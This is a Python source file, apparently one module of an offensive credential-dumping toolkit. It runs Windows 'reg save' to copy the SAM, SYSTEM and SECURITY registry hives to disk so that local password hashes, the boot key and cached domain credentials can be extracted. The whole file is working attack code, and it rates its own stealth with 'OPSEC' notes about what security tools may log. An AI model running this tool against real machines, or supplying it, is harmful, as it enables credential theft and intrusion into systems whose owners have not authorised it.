#!/usr/bin/env python3
"""
SAM/SYSTEM extraction via 'reg save' command
Standard Windows method
"""

import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict


class RegSaveExtractor:
    """
    Extract registry hives using Windows 'reg save' command
    
    OPSEC Level: MEDIUM
    - Uses legitimate Windows command
    - Creates files on disk
    - Requires admin privileges
    - May be logged by security tools
    """
    
    METHOD_NAME = "reg_save"
    OPSEC_RATING = "Medium"
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        
        # Registry paths
        self.hives = {
            'SAM': 'HKLM\\SAM',
            'SYSTEM': 'HKLM\\SYSTEM',
            'SECURITY': 'HKLM\\SECURITY'
        }
    
    def extract(self) -> Optional[Dict]:
        """
        Execute SAM/SYSTEM extraction via reg save
        
        Returns:
            Dict with extracted file paths or None on failure
        """
        print(f"\n[*] Method: reg save")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Standard Windows command")
        print(f"[*] Extracting SAM, SYSTEM, and SECURITY hives...")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Define output files
        output_files = {
            'SAM': self.output_dir / f"sam_{timestamp}.save",
            'SYSTEM': self.output_dir / f"system_{timestamp}.save",
            'SECURITY': self.output_dir / f"security_{timestamp}.save"
        }
        
        # Build extraction commands
        commands = {
            hive: f"reg save {registry_path} {output_files[hive]}"
            for hive, registry_path in self.hives.items()
        }
        
        results = {}
        success_count = 0
        
        # Execute each extraction
        for hive, cmd in commands.items():
            print(f"[*] Extracting {hive}...")
            
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    # Verify file was created
                    if output_files[hive].exists():
                        size = output_files[hive].stat().st_size
                        
                        print(f"[+] {hive} extracted successfully")
                        print(f"    File: {output_files[hive]}")
                        print(f"    Size: {size / 1024:.2f} KB")
                        
                        results[hive.lower()] = str(output_files[hive])
                        success_count += 1
                    else:
                        print(f"[-] {hive} file not created")
                else:
                    print(f"[-] {hive} extraction failed")
                    
                    if result.stderr:
                        print(f"    Error: {result.stderr.strip()}")
            
            except subprocess.TimeoutExpired:
                print(f"[-] {hive} extraction timed out")
            
            except Exception as e:
                print(f"[-] {hive} extraction error: {e}")
        
        # Check if we got all required hives
        if success_count >= 2:  # At minimum need SAM and SYSTEM
            print(f"\n[+] Registry extraction successful")
            print(f"[+] Extracted {success_count}/3 hives")
            
            results['timestamp'] = timestamp
            results['method'] = self.METHOD_NAME
            results['opsec_rating'] = self.OPSEC_RATING
            
            return results
        else:
            print(f"\n[-] Registry extraction failed")
            print(f"[-] Only {success_count}/3 hives extracted")
            print(f"[!] Need at least SAM and SYSTEM")
            
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        # reg.exe is always available on Windows
        return True
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this extraction method"""
        return {
            'name': 'reg_save',
            'description': 'Extract registry hives using reg save command',
            'opsec_rating': 'Medium',
            'requirements': [
                'Administrative privileges',
                'Write access to output directory'
            ],
            'advantages': [
                'Built-in Windows command',
                'No external tools needed',
                'Reliable and stable',
                'Works on all Windows versions'
            ],
            'disadvantages': [
                'Creates files on disk',
                'May be logged by security tools',
                'Requires admin privileges',
                'Registry access can be monitored'
            ],
            'targets': [
                'SAM (local account hashes)',
                'SYSTEM (boot key for decryption)',
                'SECURITY (cached domain credentials)'
            ]
        }
